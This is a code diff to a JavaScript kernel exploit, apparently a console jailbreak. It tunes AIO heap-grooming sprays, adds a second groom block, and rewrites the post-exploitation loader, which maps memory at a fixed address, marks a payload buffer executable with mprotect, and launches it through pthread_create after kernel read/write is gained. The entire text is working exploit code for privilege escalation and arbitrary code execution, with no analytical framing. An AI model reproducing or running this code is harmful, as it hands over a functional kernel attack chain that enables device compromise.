@@ -96,9 +96,6 @@ const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
 
 // sys/mman.h
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
 const MAP_SHARED = 1;
 const MAP_FIXED = 0x10;
 
@@ -136,13 +133,14 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 50; //TODO: check best value here for 9.xx
+const num_alias = 40;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
+var nogc = [];
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1483,7 +1481,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
     
-
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1643,7 +1640,18 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);    
+    cancel_aios(groom_ids_p, num_grooms);
+    {
+        // chosen to maximize the number of 0x100 malloc allocs per submission
+        const num_reqs = 4;
+        const groom_ids = new View4(num_grooms);
+        const groom_ids_p = groom_ids.addr;
+        const greqs = make_reqs1(num_reqs);
+        // allocate enough so that we start allocating from a newly created slab
+        spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
+        cancel_aios(groom_ids_p, num_grooms);
+    }
+        
     return [block_id, groom_ids];
 }
 
@@ -1738,18 +1746,39 @@ export async function kexploit() {
 }
 
 kexploit().then(() => {
-    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-    var payload_loader = new View4(window.pld);
-    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-    const ctx = new Buffer(0x10);
-    const pthread = new Pointer();
-    pthread.ctx = ctx;
+    function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+    window.pld_size = new Int(0x26200000, 0x9);
+
+    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
+    var payload = window.pld;
+    var bufLen = payload.length * 4
+    var payload_loader = malloc32(bufLen);
+    var loader_writer = payload_loader.backing;
+    for (var i = 0; i < payload.length; i++) {
+        loader_writer[i] = payload[i];
+    }
+    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
+    var pthread = malloc(0x10);
 
     call_nze(
         'pthread_create',
-        pthread.addr,
+        pthread,
         0,
-        payload_loader.addr,
+        payload_loader,
         payload_buffer,
     );
 })
